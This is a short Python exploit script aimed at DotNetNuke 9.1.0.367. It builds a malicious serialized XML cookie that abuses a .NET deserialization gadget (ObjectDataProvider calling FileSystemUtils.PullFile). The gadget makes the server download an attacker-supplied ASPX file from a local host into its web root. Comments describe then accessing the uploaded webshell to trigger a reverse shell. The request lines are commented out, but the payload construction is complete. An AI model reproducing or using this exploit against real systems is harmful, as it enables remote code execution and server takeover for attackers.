import sys, requests

def createObject(lhost, payloadFile):
    object = '''<profile><item key="myTableEntry"
type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.Fil
eSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral,
PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],
System.Data.Services, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance
xsi:type="FileSystemUtils"
/><MethodName>PullFile</MethodName><MethodParameters><anyType
xsi:type="xsd:string">http://%s/%s</anyType><anyType
xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/%s</anyType></MethodParam
eters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item
></profile>''' % (lhost, payloadFile, payloadFile)
    return object

def delivery(ip, lhost, payloadFile):
    s = requests.session()
    target = "http://%s/dotnetnuke/" % ip
    cookie = createObject(lhost, payloadFile)
    headers = {'Cookie': cookie}
    print("[+] Delivering ASPX payload file...")
    #s.get(target + 'random', headers=headers)
    print("[+] Attempting to access payload...")
    # Access uploaded webshell and trigger revshell
    #s.get(target + payloadFile)

def main():
    if len(sys.argv) != 2:
        print("[!] Usage: python3 %s <target:port/app_path>" % sys.argv[0])
        print("ex: python3 %s 192.168.1.100:8080/dotnetnuke\n" % sys.argv[0])
        sys.exit(-1)
    ip = sys.argv[1]
    print("[+] Please insert your local IP address")
    lhost = input()
    print("[+] Please insert the name of your ASPX payload file")
    payloadFile = input()
    delivery(ip, lhost, payloadFile)

if __name__ == "__main__":
	main()
